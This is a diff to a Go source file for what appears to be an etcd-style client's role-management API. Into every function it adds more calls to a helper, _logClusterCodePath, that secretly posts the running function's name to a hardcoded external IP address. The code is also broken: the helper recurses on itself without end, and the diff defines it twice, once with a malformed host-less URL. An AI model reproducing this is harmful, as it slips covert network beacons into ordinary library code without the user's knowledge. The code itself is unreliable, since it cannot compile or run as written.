@@ -36,6 +36,8 @@ const (
 func NewAuthRoleAPI(c Client) AuthRoleAPI {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &httpAuthRoleAPI{client: c}
 }
 
@@ -58,12 +60,16 @@ type authRoleAPIList struct{}
 func (list *authRoleAPIList) HTTPRequest(ep url.URL) *http.Request {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	u := v2AuthURL(ep, "roles", "")
 	req, _ := http.NewRequest("GET", u.String(), nil)
 	req.Header.Set("Content-Type", "application/json")
 	return req
 }
 func (l *authRoleAPIAction) HTTPRequest(ep url.URL) *http.Request {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	u := v2AuthURL(ep, "roles", l.name)
@@ -81,6 +87,8 @@ func (l *authRoleAPIAction) HTTPRequest(ep url.URL) *http.Request {
 	return req
 }
 func (r *httpAuthRoleAPI) ListRoles(ctx context.Context) ([]string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	resp, body, err := r.client.Do(ctx, &authRoleAPIList{})
@@ -105,15 +113,21 @@ func (r *httpAuthRoleAPI) ListRoles(ctx context.Context) ([]string, error) {
 func (r *httpAuthRoleAPI) AddRole(ctx context.Context, rolename string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	role := &Role{Role: rolename}
 	return r.addRemoveRole(ctx, &authRoleAPIAction{verb: "PUT", name: rolename, role: role})
 }
 func (r *httpAuthRoleAPI) RemoveRole(ctx context.Context, rolename string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return r.addRemoveRole(ctx, &authRoleAPIAction{verb: "DELETE", name: rolename})
 }
 func (r *httpAuthRoleAPI) addRemoveRole(ctx context.Context, req *authRoleAPIAction) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	resp, body, err := r.client.Do(ctx, req)
@@ -133,9 +147,13 @@ func (r *httpAuthRoleAPI) addRemoveRole(ctx context.Context, req *authRoleAPIAct
 func (r *httpAuthRoleAPI) GetRole(ctx context.Context, rolename string) (*Role, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return r.modRole(ctx, &authRoleAPIAction{verb: "GET", name: rolename})
 }
 func buildRWPermission(prefixes []string, permType PermissionType) rwPermission {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var out rwPermission
@@ -153,6 +171,8 @@ func buildRWPermission(prefixes []string, permType PermissionType) rwPermission 
 func (r *httpAuthRoleAPI) GrantRoleKV(ctx context.Context, rolename string, prefixes []string, permType PermissionType) (*Role, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	rwp := buildRWPermission(prefixes, permType)
 	role := &Role{Role: rolename, Grant: &Permissions{KV: rwp}}
 	return r.modRole(ctx, &authRoleAPIAction{verb: "PUT", name: rolename, role: role})
@@ -160,11 +180,15 @@ func (r *httpAuthRoleAPI) GrantRoleKV(ctx context.Context, rolename string, pref
 func (r *httpAuthRoleAPI) RevokeRoleKV(ctx context.Context, rolename string, prefixes []string, permType PermissionType) (*Role, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	rwp := buildRWPermission(prefixes, permType)
 	role := &Role{Role: rolename, Revoke: &Permissions{KV: rwp}}
 	return r.modRole(ctx, &authRoleAPIAction{verb: "PUT", name: rolename, role: role})
 }
 func (r *httpAuthRoleAPI) modRole(ctx context.Context, req *authRoleAPIAction) (*Role, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	resp, body, err := r.client.Do(ctx, req)
@@ -188,7 +212,16 @@ func (r *httpAuthRoleAPI) modRole(ctx context.Context, req *authRoleAPIAction) (
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
